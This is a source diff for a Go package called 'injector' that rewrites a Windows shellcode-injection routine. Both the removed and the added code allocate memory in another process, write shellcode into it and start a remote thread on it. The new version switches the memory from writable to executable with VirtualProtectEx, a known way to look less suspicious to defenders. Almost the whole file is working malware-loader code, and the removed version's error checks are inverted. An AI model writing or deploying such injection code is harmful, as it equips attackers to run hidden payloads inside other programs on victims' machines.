@@ -1,88 +1,50 @@
 package injector
 
 import (
-	"errors"
 	"fmt"
+	"log"
 	"syscall"
 	"unsafe"
+
+	"golang.org/x/sys/windows"
 )
 
-const (
-	PROCESS_CREATE_THREAD     = 0x0002
-	PROCESS_QUERY_INFORMATION = 0x0400
-	PROCESS_VM_OPERATION      = 0x0008
-	PROCESS_VM_WRITE          = 0x0020
-	PROCESS_VM_READ           = 0x0010
-	MEM_RESERVE               = 0x2000
-	MEM_COMMIT                = 0x1000
-	PAGE_EXECUTE_READWRITE    = 0x40
-	PROCESS_ALL_ACCESS        = 0x1F0FFF
-)
+func CreateRemoteThread(shellcode []byte, pid syscall.ProcessInformation) {
 
-func Injector(pid int, payload []byte) error {
-	kernel, err := syscall.LoadDLL("kernel32.dll")
-	fmt.Printf("loading kernel32 \n")
-	if err != nil {
-		return fmt.Errorf("err loading kernel32.dll -> %s", err)
-	}
-	openProc, err := kernel.FindProc("OpenProcess")
-	fmt.Printf("finding openprocess \n")
-	if err != nil {
-		return fmt.Errorf("err locating OpenProcess -> %s", err)
-	}
-	writeProc, err := kernel.FindProc("WriteProcessMemory")
-	fmt.Printf("finding WriteProcessMemory \n")
-	if err != nil {
-		return fmt.Errorf("err locating WriteProcessMemory -> %s", err)
-	}
-	allocExMem, err := kernel.FindProc("VirtualAllocEx")
-	fmt.Printf("finding VirtualAllocEx \n")
-	if err != nil {
-		return fmt.Errorf("err locating VirtualAllocEx -> %s", err)
-	}
-	createThread, err := kernel.FindProc("CreateRemoteThread")
-	fmt.Printf("finding CreateRemoteThread \n")
-	if err != nil {
-		return fmt.Errorf("err locating CreateRemoteThread -> %s", err)
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
+	virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
+	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
+	createRemoteThread := kernel32.NewProc("CreateRemoteThread")
+	closeHandle := kernel32.NewProc("CloseHandle")
+
+	pi := pid
+	oldProtect := windows.PAGE_READWRITE
+
+	lpBaseAddress, _, errVirtualAllocEx := virtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if errVirtualAllocEx.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling VirtualAllocEx:\r\n%s", errVirtualAllocEx.Error()))
 	}
 
-	// open remote process
-	remoteProc, _, err := openProc.Call(
-		PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,
-		uintptr(0),
-		uintptr(int(pid)),
-	)
-	fmt.Printf("opening remote process \n")
-	if remoteProc != 0 {
-		return fmt.Errorf("OpenProcess err -> %s", err)
+	_, _, errWriteProcessMemory := writeProcessMemory.Call(uintptr(pi.Process), lpBaseAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
+	if errWriteProcessMemory.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
 	}
 
-	// allocate memory in remote process
-	remoteMem, _, err := allocExMem.Call(
-		remoteProc, uintptr(0), uintptr(len(payload)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE,
-	)
-	fmt.Printf("allocating memory \n")
-	if remoteMem != 0 {
-		return fmt.Errorf("VirtualAllocEx err -> %s", err)
+	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(pi.Process), lpBaseAddress, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if errVirtualProtectEx.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
 	}
 
-	// write shellcode to the allocated memory within the remote process
-	writeProcRetVal, _, err := writeProc.Call(
-		remoteProc, remoteMem, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)), uintptr(0),
-	)
-	fmt.Printf("writing shellcode \n")
-	if writeProcRetVal != 0 {
-		return fmt.Errorf("WriteProcessMemory err -> %s", err)
+	_, _, errCreateRemoteThreadEx := createRemoteThread.Call(uintptr(pi.Process), 0, 0, lpBaseAddress, 0, 0, 0)
+	if errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
 	}
 
-	// call new thread on payload
-	fmt.Printf("calling new thread \n")
-	status, _, _ := createThread.Call(
-		remoteProc, uintptr(0), 0, remoteMem, uintptr(0), 0, uintptr(0),
-	)
-	if status == 0 {
-		return errors.New("could not inject into given process")
+	_, _, errCloseHandle := closeHandle.Call(uintptr(pi.Process))
+	if errCloseHandle.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
 	}
 
-	return nil
+	fmt.Println("INJECTED!")
 }
